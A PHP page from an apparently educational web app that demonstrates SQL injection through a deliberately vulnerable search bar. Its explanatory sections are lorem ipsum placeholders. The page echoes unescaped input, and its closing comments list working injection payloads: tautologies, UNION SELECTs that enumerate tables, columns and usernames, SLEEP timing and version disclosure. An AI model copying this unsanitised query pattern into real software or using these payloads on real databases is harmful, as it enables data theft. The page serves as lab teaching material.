<?php

  require_once "../templates/header.php";

  //search bar
  include "../../mvc/views/home-view.php";
  include "../../mvc/models/home-model.php";
  include "../../mvc/controllers/home-controller.php";

?>
<html>
  <head>
    <link rel="stylesheet" type="text/css" href="/public/assets/css/page_template.css">
    <link rel="stylesheet" type="text/css" href="/public/assets/css/sql-injection.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  </head>
  <body>
    <div class="video-container">
      <video autoplay muted loop class="default-vid">
        <source src="/img/video/sql-injection.mp4" type="video/mp4">
      </video>
    </div>
    <div class="colour-overlay"></div>

    <div class="subheadings">
      <h1>SQL Injection Attacks</h1>
      <!-- Blind | information schema exploits | second order (Maybe as buttons)-->
      <div class="anchor-buttons">
        <button class="first-child"><a href="#Introduction">Introduction</a></button>
        <button class="middle-child"><a href="#Risks">Risks</a></button>
        <button class="second-last-child"><a href="#Demonstration">Demonstration</a></button>
        <button class="last-child"><a href="#Solutions">Solutions</a></button>
      </div>
    </div>

    <div class="header-container">
      <h1 id="Introduction">Introduction</h1>
        <div class="p-container">
          <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
          Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
          Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
          Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
          </p>
        </div>
    </div>

    <div class="header-overlay">
        <h1 id="Risks">Risks</h1>
          <div class="p-container">
            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
            Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
            Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
            Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
            </p>
          </div>
    </div>

    <div class="header-container">
      <h1 id="Demonstration">Demonstration</h1>
        <div class="p-container">
          <h2>SQL injection example</h2>
          <p>The following is an example of search bar where you can search for vulnerabilities that are explored on this platform. <br />However, it's also vulnerable to SQL injection when appropriately escaping the single quotes (')</p>
          <div class="search-container">
            <!-- New search bar -->
            <form class="search" method="GET" action="sql-injection.php?#Demonstration">
                <!--On the same line to avoid gaps between elements-->
                <input type="text" name="search" placeholder="Search..." class="submit-txt"><button type="submit" name="submit" class="submit-btn"><i class="fa fa-search"></i></button>
            </form>
            <hr width="80%">
          </div>
        </div>
      </div>

        <?php

          if (isset($_GET['submit']) && !empty($_GET['search'])) {

            $search = $_GET['search'];

            //input validation

            //fetch user data //controller
            $controller = new home_controller();
            $data = $controller->insecureSearchData($search);

            if ($data->num_rows > 0) {
              $view = new home_view();
              $view->printQuery($data);
            }
            else {
              echo "<p class='result-container'>No results found for $search.</p>";
            }
          }

         ?>


        <div class="header-overlay">
          <h1 id="Solutions">Solutions</h1>
            <div class="p-container">
              <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
              Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
              Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
              Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
              </p>
            </div>
        </div>
    </div>
  </body>
</html>

<?php


  require_once "../templates/footer.php";



  //$this->sql = "SELECT title FROM home_buttons WHERE title LIKE '$query%'";

  //%' OR '%
  //%' OR '1' = '1
  //prints everything

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select title FROM home_buttons -- '
  //title can be replaced with php_page, id, etc

  //sql' OR title LIKE 'cross
  //prints cross-site scripting

  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
  //prints names of all tables

  //' union select username FROM USERS.USERS -- '
  //prints usernames of all users

  //sleep
  //sql'  UNION SELECT SLEEP(3)-- '

  //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
  //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

  //gets db version
  //%sql' UNION SELECT version()-- '

  //gets schema of current
  //%sql' UNION SELECT schema()-- '

  //To fix
  //prepared statement
?>
